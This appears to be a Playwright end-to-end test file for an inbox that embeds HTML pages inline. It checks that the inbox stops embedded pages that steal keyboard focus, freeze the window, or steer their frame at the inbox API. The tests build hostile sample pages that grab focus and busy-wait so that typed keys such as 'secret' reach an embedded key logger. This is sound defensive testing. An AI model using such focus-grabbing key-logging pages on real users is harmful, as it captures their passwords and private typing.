    '<input id="grab" aria-label="grab"><p id="at">at</p>',
    '<script>',
    keyLogger(name),
    `window.t0 = Date.now(); document.getElementById('at').textContent = 'ready';`,
    ...times.map((t) => `setTimeout(() => { document.getElementById('grab').focus(); const end = Date.now() + ${block}; while (Date.now() < end) {} }, ${t});`),
    '</script>',
  ].join('\n');

const keysOf = (t: { keysAt: (name: string) => string[] }, name: string) => t.keysAt(name).map((asked) => decodeURIComponent(asked.split('k=')[1] ?? '')).join('');

test('a page that grabs and blocks for less than 250 ms is stopped as soon as a key reaches it, and the notice counts them', async ({ browser, browserName }) => {
  const world = await startWorld('plannotator-inbox-inline-html-short-e2e-');
  try {
    const t = await openThread(browser, world, 'A page that blocks briefly', blockingGrabber('short', [5000, 12000], 200));
    try {
      const frame = await embedFrame(t.page, t.message, '#at', 'at');
      const t0 = await frame.evaluate(() => (window as unknown as { t0: number }).t0);
      await openReply(t.page);
      await replyBox(t.page).click();
      await t.page.keyboard.type('w0 ', { delay: 50 });
      // A pause longer than "typing", then the person starts again during the page's brief block.
      await t.page.waitForTimeout(Math.max(0, t0 + 5000 - (await frame.evaluate(() => Date.now())) + 40));
      await queueKeys(t.page, browserName, 'pw');
      await t.page.waitForTimeout(800);
      const reached = keysOf(t, 'short');
      console.log(`[${browserName}] grab, then a 200 ms block, keys queued: reply "${await replyBox(t.page).inputValue()}", page got "${reached}"`);
      if (reached.length > 0) {
        // Not silent: stopped at once, so the second grab never comes.
        await expect(t.message.locator('[data-html-embed-stopped]')).toHaveAttribute('data-html-embed-stopped', /^(keys|late)$/);
        await expectHonestNotice(t.message, reached.length);
      }
      await t.page.waitForTimeout(Math.max(0, t0 + 12_500 - Date.now()));
      expect(keysOf(t, 'short')).toBe(reached);
    } finally {
      await t.context.close().catch(() => {});
    }
  } finally {
    await world.close();
  }
});

test('a page that takes the keyboard from the page the person is typing in is stopped, and the keyboard goes back', async ({ browser, browserName }) => {
  const world = await startWorld('plannotator-inbox-inline-html-p2p-e2e-');
  try {
    const A = ['<input id="a" aria-label="a"><p id="at">ready</p>', '<script>', keyLogger('A'), '</script>'].join('\n');
    const t = await openThread(browser, world, 'Two pages', A, world.url, ['', 'Second:', '', fence(blockingGrabber('B', [6000], 1500))]);
    try {
      const pageA = await embedFrame(t.page, t.message, '#at', 'never');
      const pageB = (await (await t.message.locator('iframe[data-html-embed-frame="inline"]').nth(1).elementHandle())!.contentFrame())!;
      await expect(pageB.locator('#at')).toHaveText('ready');
      const t0 = await pageB.evaluate(() => (window as unknown as { t0: number }).t0);
      await clickInPage(t.page, pageA, '#a');
      await expect.poll(() => pageA.evaluate(() => document.activeElement?.id)).toBe('a');
      await t.page.keyboard.type('hello', { delay: 80 });
      await t.page.waitForTimeout(Math.max(0, t0 + 6000 - (await pageB.evaluate(() => Date.now())) + 200));
      await queueKeys(t.page, browserName, 'secret');
      const embeds = t.message.locator('[data-html-embed]');
      await expect(embeds.nth(1).locator('[data-html-embed-stopped]')).toHaveAttribute('data-html-embed-stopped', /^(unseen|keys)$/);
      await expect(embeds.nth(1).locator('[data-html-embed-grabbed]')).toContainText('so it was stopped');
      // The keyboard is back in page A: what the person types next lands there.
      await t.page.waitForTimeout(500);
      const reachedB = keysOf(t, 'B');
      // (Page A's own input may have lost its focus to the grab; its document has the keyboard.)
      const reachedA = keysOf(t, 'A');
      await t.page.keyboard.type('more', { delay: 60 });
      await expect.poll(() => keysOf(t, 'A')).toBe(`${reachedA}more`);
      expect(keysOf(t, 'B')).toBe(reachedB);
      console.log(`[${browserName}] page B grabs from page A, then a 1.5 s block: A got "${keysOf(t, 'A')}", B got "${reachedB}"`);
    } finally {
      await t.context.close().catch(() => {});
    }
  } finally {
    await world.close();
  }
});

test('Tab walks from page to page through each "Use this page" button, and stops nothing', async ({ browser }) => {
  const world = await startWorld('plannotator-inbox-inline-html-tabwalk-e2e-');
  try {
    const context = await browser.newContext({ viewport: { width: 1200, height: 1000 } });
    await stubWeb(context);
    const PAGE = '<input id="t" aria-label="t"><p id="at">ready</p>';
    const sent = await world.agent.send({
      project_path: world.project,
      thread: 'Tab walk',
      subject: 'Tab walk',
      body: ['[before](https://example.com/a)', '', fence(PAGE), '', '[between](https://example.com/b)', '', fence(PAGE), '', '[after](https://example.com/c)'].join('\n'),
    });
    const page = await context.newPage();
    await page.goto(`${world.url}#thread=${sent.thread_id}`);
    const message = page.locator(`[data-message-id="${sent.message_id as string}"]`);
    await expect(message.locator('iframe[data-html-embed-frame="inline"]')).toHaveCount(2);
    await embedFrame(page, message, '#at', 'never');
    // Start on the link before the pages (Safari's Tab skips links; focus it directly).
    await message.getByRole('link', { name: 'before' }).focus();
    const walk: string[] = [];
    for (let press = 0; press < 8; press += 1) {
      await page.keyboard.press('Tab');
      await page.waitForTimeout(150);
      walk.push(
        await page.evaluate(() => {
          const active = document.activeElement as HTMLElement | null;
          if (!active) return 'none';
          const figures = [...document.querySelectorAll('[data-html-embed]')];
          const at = figures.indexOf(active.closest('[data-html-embed]') as Element);
          if (active.tagName === 'IFRAME' && at >= 0) return `page${at}`;
          if (active.getAttribute('aria-label') === 'Use this page') return `door${at}`;
          return active.tagName;
        }),
      );
      walk[walk.length - 1] += (await message.locator('[data-html-embed-stopped]').count()) ? ' (stopped)' : '';
    }
    // Each page's door comes before the page itself, in both engines.
    expect(walk.indexOf('door0')).toBeGreaterThanOrEqual(0);
    expect(walk.indexOf('page0')).toBeGreaterThan(walk.indexOf('door0'));
    expect(walk.indexOf('door1')).toBeGreaterThan(walk.indexOf('page0'));
    expect(walk.indexOf('page1')).toBeGreaterThan(walk.indexOf('door1'));
    await expect(message.locator('[data-html-embed-stopped]')).toHaveCount(0);
    await context.close();
  } finally {
    await world.close();
  }
});

/** An innocent page: focuses its canvas, then draws for 400 ms on the thread. */
const CANVAS = [
  '<canvas id="c" width="300" height="120" tabindex="0"></canvas><p id="at">ready</p>',
  '<script>',
  "setTimeout(() => { const c = document.getElementById('c'); c.focus(); const end = performance.now() + 400; let x = 0; while (performance.now() < end) { x += Math.sqrt(x + 1); } c.getContext('2d').fillRect(0, 0, 50, 50); }, 1500);",
  '</script>',
].join('\n');

test('an innocent page that focuses itself and then works for a while, with nothing typed, gets a calm notice', async ({ browser, browserName }) => {
  const world = await startWorld('plannotator-inbox-inline-html-canvas-e2e-');
  try {
    const t = await openThread(browser, world, 'A canvas page', CANVAS);
    try {
      await embedFrame(t.page, t.message, '#at', 'never');
      await t.page.waitForTimeout(3000);
      const stopped = await t.message.locator('[data-html-embed-stopped]').count();
      // Where the page shares the window's thread the hold is seen and the page stopped; the notice
      // says what happened and claims nothing about keys. Elsewhere it is a plain grab.
      if (stopped) await expectHonestNotice(t.message, 0);
      console.log(`[${browserName}] innocent canvas page: ${stopped ? await t.message.locator('[data-html-embed-grabbed]').innerText() : 'not stopped'}`);
    } finally {
      await t.context.close().catch(() => {});
    }
  } finally {
    await world.close();
  }
});

test('a page that steers its frame at the Inbox is refused', async ({ browser }) => {
  const world = await startWorld('plannotator-inbox-inline-html-nav-e2e-');
  try {
    const opened = await openThread(browser, world, 'A page that wanders', WANDERER);
    try {
      const answered = opened.page.waitForResponse((response) => response.url().includes('/api/inbox/threads?wander'));
      expect((await answered).status()).toBe(403);
      await expect(opened.message.locator('[data-html-embed-left]')).toContainText('went to another address');
    } finally {
      await opened.context.close().catch(() => {});
    }
  } finally {
    await world.close();
  }
});

test('Chromium: a busy page does not freeze the window', async ({ browserName }) => {
  // WebKit runs every frame in the window's process: a busy page there still stalls the window (documented).
  test.skip(browserName !== 'chromium', 'Chromium isolates another site in its own process');
  // A Chromium that isolates sites but not sandboxed frames (Chrome without IsolateSandboxedIframes,
  // as on Android): a frame on the window's own origin shares its process; one on the other
  // loopback name does not. Playwright's headless shell isolates neither, desktop Chrome both.
  const isolating = await chromium.launch({ headless: true, args: ['--site-per-process', '--disable-features=IsolateSandboxedIframes'] });
  const world = await startWorld('plannotator-inbox-inline-html-busy-e2e-');
  try {
    const opened = await openThread(isolating, world, 'A busy page', BUSY);
    try {
      const frame = await embedFrame(opened.page, opened.message, '#busy', 'never');
      expect(frame.url().startsWith(`${world.embedOrigin}/`)).toBe(true);
      // The page spins from 300 ms after it ran, for 5 s: its own frame is stuck meanwhile, the window is not.
      await opened.page.waitForTimeout(600);
      const frameStarted = Date.now();
      const frameAnswered = frame.evaluate(() => 1).then(() => Date.now() - frameStarted);
      const windowTimes: number[] = [];
      for (let i = 0; i < 6; i += 1) {
        const started = Date.now();
        await opened.page.evaluate(() => document.title);
        windowTimes.push(Date.now() - started);
        await opened.page.waitForTimeout(250);
      }
      expect(await frameAnswered).toBeGreaterThan(2000);
      expect(Math.max(...windowTimes)).toBeLessThan(1000);
    } finally {
      await opened.context.close().catch(() => {});
    }
  } finally {
    await world.close();
    await isolating.close();
  }
});
